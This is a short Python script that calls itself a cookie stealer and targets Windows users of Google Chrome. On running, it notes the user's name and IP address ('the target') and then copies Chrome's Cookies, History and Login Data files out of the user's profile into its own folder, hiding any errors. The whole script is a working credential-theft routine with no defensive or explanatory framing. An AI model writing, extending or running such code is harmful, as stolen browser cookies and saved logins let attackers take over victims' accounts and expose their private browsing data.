import os
import errno
import shutil
import socket
import base64
import getpass
import datetime,time

currentdir = os.getcwd()
curentuser = getpass.getuser()

path_to_cookies = currentdir

try:
	ip_address = socket.gethostbyname(socket.gethostname()) #getting the ip address of the target
except:
	pass

def cookiestealer():
	cookiepath = 'C://Users//' + curentuser + '//AppData//Local//Google//Chrome//User Data//Default//'

	cookiefile = 'Cookies'
	historyfile = 'History'
	LoginDatafile = "Login Data"

	copycookie = cookiepath + "//" + cookiefile
	copyhistory = cookiepath + "//" + historyfile
	copyLoginData = cookiepath + "//" + LoginDatafile

	filesindir = os.listdir(path_to_cookies)

	if copycookie not in filesindir:
		try:
			shutil.copy2(copycookie, path_to_cookies)
		except:
			pass
	else:
		pass
		
	if copyhistory not in filesindir:
		try:
			shutil.copy2(copyhistory, path_to_cookies)
		except:
			pass
	else:
		pass
	
	if copyLoginData not in filesindir:
		try:
			shutil.copy2(copyLoginData, path_to_cookies)
		except:
			pass
	else:
		pass
		
	return True

    
cookiestealer()